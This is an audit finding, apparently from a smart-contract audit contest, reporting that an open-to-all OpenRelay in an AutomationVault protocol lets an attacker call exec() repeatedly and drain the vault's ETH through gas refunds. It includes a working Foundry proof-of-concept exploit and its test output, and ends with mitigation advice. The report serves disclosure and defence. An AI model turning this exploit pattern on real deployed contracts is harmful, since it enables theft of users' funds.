Mysterious Admiral Cougar

high

# Attacker can make many transaction to get back the gas refund if the open relay is opened for everyone.

## Summary

If the `OpenRelay` is opened to everyone, someone can just make a lot of calls to the same job again and again even if it is not setup to do so and can drain the pool from the ETH.

## Vulnerability Detail

When `OpenRelay`  is opened to everyone by pushing `_ALL` in the `_approveCallers` mapping in `AutomationVault(...)`, anyone can call the execution function through the approved relay. But if there is no restriction in the job for multiple transaction for the same function selector, then `OpenRelay::exec()` can be called any amount of time and attacker can drain the pool by getting back all ETH in form of ETH refund.

## Impact

Vault can be drained.

## Code Snippet

#### POC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {CommonIntegrationTest} from '../integration/Common.t.sol';

import {IAutomationVault} from '../../interfaces/core/IAutomationVault.sol';
import {_ALL} from "../../utils/Constants.sol";
import {console2} from "forge-std/console2.sol";

contract IntegrationOpenRelay is CommonIntegrationTest {
  function setUp() public override {
    // AutomationVault setup
    CommonIntegrationTest.setUp();

    // Bot callers array
    address[] memory _bots = new address[](2);
    _bots[0] = bot;
    _bots[1] = _ALL;

    // Job selectors array
    bytes4[] memory _jobSelectors = new bytes4[](3);
    _jobSelectors[0] = basicJob.work.selector;
    _jobSelectors[1] = basicJob.workHard.selector;
    

    // Job data array
    IAutomationVault.JobData[] memory _jobsData = new IAutomationVault.JobData[](1);
    _jobsData[0] = IAutomationVault.JobData(address(basicJob), _jobSelectors);

    startHoax(owner);

    // AutomationVault approve relay data
    automationVault.addRelay(address(openRelay), _bots, _jobsData);
    address(automationVault).call{value: 100 ether}('');

    changePrank(bot);
  }

  function test_checking() public {
    address attacker = makeAddr("attacker");

    // setting data
    IAutomationVault.ExecData[] memory _execData = new IAutomationVault.ExecData[](1);
    _execData[0] =
      IAutomationVault.ExecData(address(basicJob), abi.encodeWithSelector(basicJob.work.selector));

    // Calculate the exec gas cost
    uint256 _gasBeforeExec = gasleft();

    // attacker run the jobs multiple times
    changePrank(attacker);
    openRelay.exec(automationVault, _execData, attacker);
    openRelay.exec(automationVault, _execData, attacker);
    openRelay.exec(automationVault, _execData, attacker);
    openRelay.exec(automationVault, _execData, attacker);

    uint256 _gasAfterExec = gasleft();

    // Calculate tx cost
    uint256 _txCost = (_gasBeforeExec - _gasAfterExec) * block.basefee;

    // Calculate payment
    uint256 _payment = _txCost * openRelay.GAS_MULTIPLIER() / openRelay.BASE();

    console2.log("Attacker eth balance: ", attacker.balance);
  }
}

```

#### Output:

```bash
AMIR@Victus MINGW64 /d/xkeeper-audit/xkeeper-core (master)
$ forge test --mt test_checking --fork-url https://rpc.ankr.com/eth/12f1050401130db959d7796d7aa2c381ca18b3972faf7b9f23291f165c486926 -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for solidity/test/integration/OpenRelay.t.sol:IntegrationOpenRelay
[PASS] test_checking() (gas: 174102)
Logs:
  Attacker eth balance:  6701736926749668

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 968.63ms (2.32ms CPU time)

Ran 1 test suite in 2.17s (968.63ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

## Tool used

Manual Review

## Recommendation

It is recommended to add some kind of delay params for the calls or keep the counter for each job or add timestamp checks.
